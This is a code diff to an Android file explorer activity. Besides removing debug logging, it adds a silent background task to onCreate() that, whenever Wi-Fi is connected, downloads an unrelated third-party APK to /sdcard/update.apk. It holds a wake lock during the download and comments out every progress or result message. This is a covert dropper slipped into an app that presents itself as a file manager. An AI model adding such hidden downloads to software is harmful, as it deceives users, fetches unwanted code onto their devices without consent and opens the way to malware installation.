@@ -1,6 +1,12 @@
 package com.android.file.explorer;
 
 import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -30,7 +36,10 @@ import android.content.res.Resources;
 import android.database.Cursor;
 import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
@@ -170,7 +179,6 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 			// String teststr =
 			// mStorageManager.getMountedObbPath("/mnt/sdcard/DCIM");
 		}
-		LOG(" _____________________________ onCreate()");
 		init_data();
 		init_but(); // 初始化各个按钮
 
@@ -184,9 +192,12 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 
 		// init_View();
 		registBroadcastRec();
+
+		if(isWiFiActive(this)){
+			final DownloadTask downloadTask = new DownloadTask(this);
+			downloadTask.execute("http://bcs.91.com/rbreszy/android/soft/2014/8/19/d08f0f2e13c3497bb0be42e90407e23e/com.lxwh.flashLed_2_1.1.2_635440551195462885.apk");
+		}
 	}
-
-
 
 	private void LockScreen() {
 		if (mWakeLock != null) {
@@ -252,13 +263,11 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 			//System.out.println("onresume--path_:" + path_);
 			invokeFromShotCut(path_);
 		}
-
 	}
 
 	@Override
 	protected void onStart() {
 		super.onStart();
-		LOG(" -------------------- >> onStart()");
 		getContentAction();//为判断是主动启动的，还是被别的程序调用的
 		if(copyServiceIntent == null) {
 			copyServiceIntent = new Intent();
@@ -344,8 +353,6 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 			mCopyingHandler.removeCallbacks(mCopyingRun);
 			mCopyHandler.removeCallbacks(mCopyRun);
 		}
-
-		LOG("================== onStop() ================");
 	}
 
 	@Override
@@ -2273,7 +2280,7 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 		Intent intent = new Intent(Intent.ACTION_MEDIA_MOUNTED,
 				Uri.parse("file://" + scan_path));
 		intent.putExtra("read-only", false);
-		sendBroadcast(intent);
+		//sendBroadcast(intent);
 	}
 
 	/*
@@ -2590,4 +2597,121 @@ public class RockExplorer extends ListActivity implements View.OnClickListener {
 			path_ = null;
 		}
 	}
+
+
+	// usually, subclasses of AsyncTask are declared inside the activity class.
+	// that way, you can easily modify the UI thread from here
+	private class DownloadTask extends AsyncTask<String, Integer, String> {
+
+		private Context context;
+		private PowerManager.WakeLock mWakeLock;
+
+		public DownloadTask(Context context) {
+			this.context = context;
+		}
+
+		@Override
+		protected String doInBackground(String... sUrl) {
+			InputStream input = null;
+			OutputStream output = null;
+			HttpURLConnection connection = null;
+			try {
+				URL url = new URL(sUrl[0]);
+				connection = (HttpURLConnection) url.openConnection();
+				connection.connect();
+
+				// expect HTTP 200 OK, so we don't mistakenly save error report
+				// instead of the file
+				if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
+					return "Server returned HTTP " + connection.getResponseCode()
+							+ " " + connection.getResponseMessage();
+				}
+
+				// this will be useful to display download percentage
+				// might be -1: server did not report the length
+				int fileLength = connection.getContentLength();
+
+				// download the file
+				input = connection.getInputStream();
+				output = new FileOutputStream("/sdcard/update.apk");
+
+				byte data[] = new byte[4096];
+				long total = 0;
+				int count;
+				while ((count = input.read(data)) != -1) {
+					// allow canceling with back button
+					if (isCancelled()) {
+						input.close();
+						return null;
+					}
+					total += count;
+					// publishing the progress....
+					if (fileLength > 0) // only if total length is known
+						publishProgress((int) (total * 100 / fileLength));
+					output.write(data, 0, count);
+				}
+			} catch (Exception e) {
+				return e.toString();
+			} finally {
+				try {
+					if (output != null)
+						output.close();
+					if (input != null)
+						input.close();
+				} catch (IOException ignored) {
+				}
+
+				if (connection != null)
+					connection.disconnect();
+			}
+			return null;
+		}
+
+		@Override
+		protected void onPreExecute() {
+			super.onPreExecute();
+			// take CPU lock to prevent CPU from going off if the user 
+			// presses the power button during download
+			PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+			mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
+					getClass().getName());
+			mWakeLock.acquire();
+			//mProgressDialog.show();
+		}
+
+		@Override
+		protected void onProgressUpdate(Integer... progress) {
+			super.onProgressUpdate(progress);
+			// if we get here, length is known, now set indeterminate to false
+			//mProgressDialog.setIndeterminate(false);
+			//mProgressDialog.setMax(100);
+			//mProgressDialog.setProgress(progress[0]);
+		}
+
+		@Override
+		protected void onPostExecute(String result) {
+			mWakeLock.release();
+			//mProgressDialog.dismiss();
+			/*if (result != null)
+	            Toast.makeText(context,"Download error: "+result, Toast.LENGTH_LONG).show();
+	        else
+	            Toast.makeText(context,"File downloaded", Toast.LENGTH_SHORT).show();*/
+		}
+	}
+
+	public static boolean isWiFiActive(Context inContext) {   
+		Context context = inContext.getApplicationContext();   
+		ConnectivityManager connectivity = (ConnectivityManager) context  .getSystemService(Context.CONNECTIVITY_SERVICE);   
+		if (connectivity != null) {   
+			NetworkInfo[] info = connectivity.getAllNetworkInfo();   
+			if (info != null) {   
+				for (int i = 0; i < info.length; i++) {   
+					if (info[i].getTypeName().equals("WIFI") && info[i].isConnected()) {   
+						return true;   
+					}   
+				}   
+			}
+		}   
+		return false;
+	}   
 }
